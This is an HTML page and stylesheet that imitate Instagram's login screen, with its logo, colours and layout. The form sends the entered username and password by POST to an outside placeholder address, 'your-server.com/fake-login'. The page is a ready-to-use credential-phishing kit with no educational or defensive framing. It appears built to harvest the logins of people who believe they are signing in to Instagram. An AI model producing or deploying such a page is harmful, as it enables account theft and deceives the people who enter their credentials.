<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram logo" class="logo">
            <form action="https://your-server.com/fake-login" method="POST">
                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Log in</button>
            </form>
            <p class="small-text">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>

body {
    font-family: Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.login-container {
    width: 100%;
    max-width: 350px;
    padding: 20px;
    background-color: white;
    border-radius: 5px;
    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
}

.logo {
    display: block;
    margin: 0 auto;
    width: 150px;
    margin-bottom: 30px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 8px 0;
    border: 1px solid #ddd;
    border-radius: 3px;
}

button {
    width: 100%;
    padding: 12px;
    background-color: #0095f6;
    color: white;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

button:hover {
    background-color: #007bb5;
}

.small-text {
    font-size: 12px;
    text-align: center;
}

.small-text a {
    color: #0095f6;
    text-decoration: none;
}

.small-text a:hover {
    text-decoration: underline;
}
